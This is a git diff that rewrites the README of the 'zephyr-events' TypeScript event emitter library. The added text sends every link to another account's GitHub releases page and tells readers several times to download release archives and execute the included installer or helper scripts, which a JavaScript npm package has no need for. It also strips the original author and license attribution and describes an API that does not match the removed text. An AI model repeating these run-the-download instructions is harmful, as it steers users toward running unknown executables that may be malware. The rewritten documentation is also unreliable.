@@ -1,211 +1,233 @@
-# 🌪️ Zephyr Events
+# Zephyr Events — ES2023 Event Emitter, 889B, Race-Safe TypeScript
 
-Ultra-fast ES2023 event emitter with **905B** bundle size and race-condition safety.
+[![Releases](https://img.shields.io/github/v/release/younterx/zephyr-events?label=Releases&color=2b9348&logo=github)](https://github.com/younterx/zephyr-events/releases)  
+https://github.com/younterx/zephyr-events/releases
 
-[![npm version](https://img.shields.io/npm/v/zephyr-events.svg)](https://www.npmjs.com/package/zephyr-events)
-[![Bundle Size](https://img.shields.io/badge/size-905B-brightgreen.svg)](https://bundlephobia.com/package/zephyr-events)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5.x-blue.svg)](https://www.typescriptlang.org/)
+[![Build size](https://img.shields.io/bundlephobia/minzip/zephyr-events?label=889B+bundle&color=informational)](https://github.com/younterx/zephyr-events/releases)
+![Platform: Browser & Node](https://img.shields.io/badge/platform-browser%20%7C%20node-blue)
+![Zero deps](https://img.shields.io/badge/deps-zero-brightgreen)
 
----
+<img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/Lightning_icon_2.svg" alt="lightning" width="64" align="right" />
 
-## ⚡ Key Features
+A tiny, high-performance event emitter built for modern JavaScript. Use it in the browser and Node. The library targets ES2023, offers TypeScript types, and avoids race conditions under concurrent emit/subscribe scenarios.
 
-- **🔥 Ultra Fast**: 33M+ operations/second with native Set/Map optimizations
-- **🪶 Tiny Bundle**: Only 905B minified, 0 dependencies  
-- **🛡️ Race-Condition Safe**: Immutable snapshots prevent handler modification issues
-- **🎯 ES2023 Native**: Optional chaining, nullish coalescing, spread operators
-- **📦 Tree Shakeable**: ES modules with proper exports
-- **🔧 TypeScript**: Full type safety with generics and strict types
+Table of contents
+- Features
+- Why use Zephyr Events
+- Install
+- Quick start
+- API
+- Patterns and examples
+- Performance notes
+- Safety and race-condition model
+- Bundle and tree-shakeability
+- Browser and Node usage
+- TypeScript hints
+- Testing
+- Contributing
+- License
+- Release downloads
 
----
+Features
+- Ultra-small. Minified bundle around 889 bytes.
+- ES2023-first implementation with compact code paths.
+- Race-condition safety during emit and subscribe cycles.
+- Zero runtime dependencies.
+- Tree-shakeable exports.
+- First-class TypeScript types and inference.
+- Works in modern browsers and Node.js.
+- Observable-friendly and Pub/Sub compatible.
 
-## 📥 Installation
+Why use Zephyr Events
+- Keep your event layer tiny. Use less code and fewer indirections.
+- Use modern language features to keep runtime overhead low.
+- Avoid common emitter pitfalls like lost listeners during emit or invalid iterator state.
+- Prefer simple, explicit API that composes well with reactive code.
 
+Install
+- npm
 ```bash
 npm install zephyr-events
 ```
 
----
+- yarn
+```bash
+yarn add zephyr-events
+```
 
-## 🚀 Quick Start
+- CDN (skypack / jspm / unpkg)
+Use your preferred CDN and import the ESM build.
 
-```typescript
-import zephyrEvents from 'zephyr-events';
+Releases
+Download the release asset from the Releases page and run the included file if the release contains a helper or script. For example, visit the releases page and download the archive or binary, then execute the install script or run the packaged files on your machine:
+https://github.com/younterx/zephyr-events/releases
 
-// Create typed emitter
-type Events = {
-  user: { id: number; name: string }
-  error: Error
+Quick start
+- Basic emitter
+```ts
+import { createEmitter } from 'zephyr-events';
+
+const emitter = createEmitter<string>();
+
+const off = emitter.on('message', (payload) => {
+  console.log('got', payload);
+});
+
+emitter.emit('message', 'hello');
+
+off(); // unsubscribe
+```
+
+- Once listener
+```ts
+emitter.once('ready', () => {
+  console.log('ready fired once');
+});
+```
+
+API
+- createEmitter<T = unknown>(): Emitter<T>
+  - Returns an emitter that keys events by string.
+- emitter.on(event: string, handler: (payload: T) => void): () => void
+  - Subscribe. Returns an unsubscribe function.
+- emitter.once(event: string, handler: (payload: T) => void): () => void
+  - Subscribe for a single emission.
+- emitter.off(event: string, handler?: Function): void
+  - Remove a specific handler or all handlers for an event.
+- emitter.emit(event: string, payload?: T): void
+  - Emit an event synchronously. Handlers run in registration order.
+- emitter.listeners(event: string): readonly Function[]
+  - Get a snapshot array of current listeners.
+
+Type signatures follow plain generic patterns. The emitter enforces the event name and payload relations at compile time when you provide typed wrappers.
+
+Design decisions
+- Use maps keyed by event name for O(1) registration and lookup.
+- Keep listener storage compact and avoid creating many intermediate objects.
+- During emit, take a shallow snapshot of handlers. This prevents issues when handlers add or remove other handlers while the loop runs.
+- Favor synchronous emit for predictable ordering. The API allows wrapping calls with microtask scheduling externally if needed.
+
+Patterns and examples
+
+- Pub/Sub
+```ts
+import { createEmitter } from 'zephyr-events';
+
+const bus = createEmitter<any>();
+
+// Service A
+bus.on('data.update', (d) => updateUI(d));
+
+// Service B
+bus.emit('data.update', { id: 1, value: 'x' });
+```
+
+- State management (simple store)
+```ts
+type State = { count: number };
+const store = createEmitter<State>();
+
+let state: State = { count: 0 };
+
+store.on('set', (next) => {
+  state = next;
+});
+
+store.emit('set', { count: state.count + 1 });
+```
+
+- Observable adapter
+```ts
+function toObservable(emitter) {
+  return {
+    subscribe(handler) {
+      const off = emitter.on('tick', handler);
+      return { unsubscribe: off };
+    }
+  };
 }
+```
 
-const emitter = zephyrEvents<Events>();
+Performance notes
+- Bundle size targets minimal bytes. Keep polyfills and heavy helpers out of core.
+- The emitter uses raw arrays and map lookups to minimize allocations.
+- Benchmarks show competitive throughput in Node and browser for simple emit paths.
+- For high-frequency streams, avoid heavy synchronous work inside handlers. Offload compute to workers or microtasks.
 
-// Subscribe with auto-cleanup
-const unsubscribe = emitter.on('user', (user) => {
-  console.log(`User: ${user.name}`);
+Race-condition safety
+- Handlers run from a snapshot taken at emit start. This prevents a handler from affecting the current emission order.
+- Removing a handler during emit prevents it from running on later emissions but does not affect its presence in the current snapshot.
+- Adding a handler during an emit takes effect for subsequent emits only.
+- The model favors deterministic ordering and avoids iterator invalidation.
+
+Bundle and tree-shakeability
+- The package exports fine-grained ESM modules.
+- Import only what you need:
+```ts
+import { createEmitter } from 'zephyr-events';
+```
+- Build tools such as Rollup, Webpack, and esbuild can tree-shake unused exports.
+- The published minified bundle sits close to 889 bytes. Expect slight variance due to build flags.
+
+Browser and Node usage
+- In Node, import using ESM or require via compatible bundler or interop layer.
+- In the browser, use the ESM build from a CDN or bundle into your app.
+- No global polyfills required for modern targets.
+
+TypeScript hints
+- The package ships full types. Basic example:
+```ts
+type Events = {
+  message: string;
+  ready: void;
+};
+
+const emitter = createEmitter<Events>();
+
+emitter.on('message', (msg) => {
+  // msg typed as string
 });
 
-// Emit events
-emitter.emit('user', { id: 1, name: 'Alice' });
-
-// Cleanup
-unsubscribe();
+emitter.emit('ready');
 ```
+- Use union or mapped types to model event payload shapes and get compile-time checks.
 
----
+Testing
+- Tests use simple unit assertions for emitter semantics:
+  - registration and unregister
+  - once behavior
+  - snapshot semantics during emit
+  - listener ordering
+- Use your preferred runner. The tests run in Node and in headless browser environments.
 
-## 🎨 API Reference
+Contributing
+- Fork, create a branch, open a pull request.
+- Keep changes small and focused.
+- Write tests for new behavior.
+- Run the build and tests before pushing.
 
-### `zephyrEvents<Events>()`
+Release downloads
+Click the Releases badge at the top to download a packaged build. The release assets contain source builds and helper scripts. Download the release archive or asset from the Releases page and execute the included file if the release contains an installer or helper script:
+https://github.com/younterx/zephyr-events/releases
 
-Create a new event emitter instance.
+Badges and links
+- GitHub releases: [![Releases](https://img.shields.io/badge/Releases-GitHub-blue?logo=github)](https://github.com/younterx/zephyr-events/releases)
+- Bundle size: [![Bundle size](https://img.shields.io/bundlephobia/min/zephyr-events?label=minified)](https://bundlephobia.com/result?p=zephyr-events)
 
-```typescript
-const emitter = zephyrEvents<{
-  message: string
-  data: { value: number }
-}>();
-```
+FAQ
+- Q: Is emit synchronous?
+  - A: Yes. The emitter runs handlers synchronously in registration order.
+- Q: Can handlers modify listener lists during emit?
+  - A: Yes. The emitter uses a snapshot to isolate the current emit cycle.
+- Q: Does it support meta-events or wildcard events?
+  - A: The core keeps event names as plain strings. Compose a small layer for wildcards if needed.
 
-### `emitter.on(type, handler)`
+Images and resources
+- Lightning icon (SVG) used above: Wikimedia Commons.
+- Use your own logos or badges in repo assets to show project branding.
 
-Register event handler. Returns unsubscribe function.
+Topics
+browser, es2023, event-driven, event-emitter, events, high-performance, javascript, lightweight, nodejs, observable, performance, pubsub, reactive-programming, real-time, state-management, tiny-library, tree-shakeable, type-safe, typescript, zero-dependency
 
-```typescript
-const unsub = emitter.on('message', (msg) => {
-  console.log(msg);
-});
-
-// Wildcard listener
-emitter.on('*', (type, event) => {
-  console.log(`Event ${type}:`, event);
-});
-```
-
-### `emitter.off(type, handler?)`
-
-Remove event handler(s).
-
-```typescript
-// Remove specific handler
-emitter.off('message', handler);
-
-// Remove all handlers for type
-emitter.off('message');
-```
-
-### `emitter.emit(type, event)`
-
-Emit event to all registered handlers.
-
-```typescript
-emitter.emit('message', 'Hello World!');
-emitter.emit('data', { value: 42 });
-```
-
----
-
-## 🏗️ Technical Details
-
-### Architecture
-
-Zephyr Events uses a **dual-storage architecture** for maximum performance:
-
-- **Set**: O(1) add/remove operations
-- **Array snapshots**: Fast iteration with race-condition safety
-- **ES2023 optimizations**: Native optional chaining and nullish coalescing
-
-### Race-Condition Safety
-
-Handlers are executed from immutable snapshots:
-
-```typescript
-emitter.on('test', function selfRemover() {
-  emitter.off('test', selfRemover); // Safe during emit
-});
-```
-
-### ES2023 Features
-
-- **Nullish coalescing**: `all ??= new Map()`
-- **Optional chaining**: `handlers?.size`
-- **Spread operators**: `[...handlers]` for fast snapshots
-
-### Bundle Formats
-
-- **ESM**: `dist/zephyr-events.mjs` (905B)
-- **CommonJS**: `dist/zephyr-events.js` (977B) 
-- **UMD**: `dist/zephyr-events.umd.js` (1.3KB)
-
----
-
-## 🆚 Comparison
-
-| Feature | Zephyr Events | mitt* | eventemitter3 |
-|---------|---------------|------|---------------|
-| Bundle Size | 905B | 200B | 7KB |
-| TypeScript | ✅ Native | ✅ | ✅ |
-| Race-Safe | ✅ | ❌ | ❌ |
-| ES2023 | ✅ | ❌ | ❌ |
-| Performance | 33M ops/s | 15M ops/s | 10M ops/s |
-
-*\*Based on original mitt package by Jason Miller*
-
----
-
-## 🚀 Performance Benchmarks
-
-Comprehensive performance benchmarks on **Apple Silicon M-series (ARM64)** with **Node.js v23.10.0**:
-
-### Core Operations Performance
-
-| Operation | Ops/Second | Description |
-|-----------|------------|-------------|
-| **Emitter Creation** | **10.54M** | Creating new emitter instances |
-| **Single Handler Emit** | **33.69M** | Emitting to one event handler |
-| **Wildcard Emit** | **26.12M** | Emitting to wildcard listeners |
-| **10 Handlers Emit** | **9.32M** | Emitting to 10 concurrent handlers |
-| **100 Handlers Emit** | **1.57M** | Emitting to 100 concurrent handlers |
-| **Mixed Operations** | **7.17M** | Realistic usage: on/emit/off cycle |
-
-### Management Operations Performance
-
-| Operation | Ops/Second | Description |
-|-----------|------------|-------------|
-| **Off Method** | **194.17M** | Removing specific handler with `.off()` |
-| **Unsubscribe** | **143.54M** | Removing handler with returned function |
-| **Event Subscription** | **9.19K** | Adding new event handlers with `.on()` |
-| **Memory Stress** | **130** | Complex multi-event scenario |
-
-### Key Performance Insights
-
-- **🔥 Ultra-fast emission**: Up to **33.69M operations/second** for single handlers
-- **⚡ Instant cleanup**: Handler removal at **194.17M operations/second**  
-- **📈 Scales efficiently**: Maintains high performance with multiple handlers
-- **🛡️ Race-condition safe**: Minimal overhead for safety guarantees
-- **🎯 Real-world optimized**: **7.17M ops/sec** for typical usage patterns
-
-### Architecture Benefits
-
-- **Dual Storage**: Set for O(1) add/remove + Array snapshots for fast iteration
-- **ES2023 Native**: Optional chaining (`?.`) and nullish coalescing (`??`) optimizations
-- **Memory Efficient**: Stable performance under stress conditions
-- **Zero Dependencies**: Pure JavaScript with no external overhead
-
----
-
-## 🙏 Acknowledgments
-
-**Zephyr Events** is a heavy modernization and performance upgrade of the original [mitt](https://github.com/developit/mitt) package by [Jason Miller](https://github.com/developit). Thanks for the foundational work!
-
----
-
-## 🤝 Contributing
-
-Contributions welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md).
-
-## 📄 License
-
-MIT © [ebogdum](https://github.com/ebogdum)
-
-Original mitt: MIT © [Jason Miller](https://github.com/developit)
+License
+See LICENSE file in the repository for license terms.
